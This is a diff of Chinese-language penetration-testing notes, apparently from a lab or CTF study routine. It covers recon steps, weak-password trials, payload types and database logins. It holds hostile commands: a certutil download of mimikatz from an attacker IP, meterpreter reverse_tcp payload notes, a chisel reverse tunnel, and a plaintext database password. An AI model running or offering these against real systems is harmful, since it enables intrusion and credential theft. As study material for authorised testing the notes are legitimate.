@@ -7,7 +7,8 @@
 7.使用burpsuite的spider遍利目力
 8.找到服務後,嘗試找到服務的原本,查看配置文件或是版本訊息(官網或GitHub)
 9.查看每個html的source
-10
+10.弱密碼手動嘗試所有服務ssh,ftp,web
+
 
 
 
@@ -24,17 +25,17 @@ certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_t
 4.nc多嘗試幾個版本
 5.winpeas.exe多嘗試幾個
 6.certutil及curl可以嘗試下載
-7.不同端口測試
+7.不同端口測試(測試22,80,443)
 
 ###
 windows/meterpreter/reverse_tcp 斜線是不穩定,給mutil handler使用,容量大
 windows/meterpreter_reverse_tcp 底線是穩定,容量小
 
 
-###MySQL操作指令
+###數據庫操作指令
 指定本地 mysql -u root -p -h 127.0.0.1
 不做互動式 mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
-
+PostgreSQL數據庫 psql -h 192.168.69.56 -U postsgres -p 5432
 
 ###tunnel隧道windows
 .\chisel.exe client 10.10.14.45:9002 R:3306:localhost:3306 R:8888:localhost:8888
@@ -49,4 +50,7 @@ windows/meterpreter_reverse_tcp 底線是穩定,容量小
 
 
 ###數據庫服務嘗試弱密碼登入及暴力破解
+
+
+
 
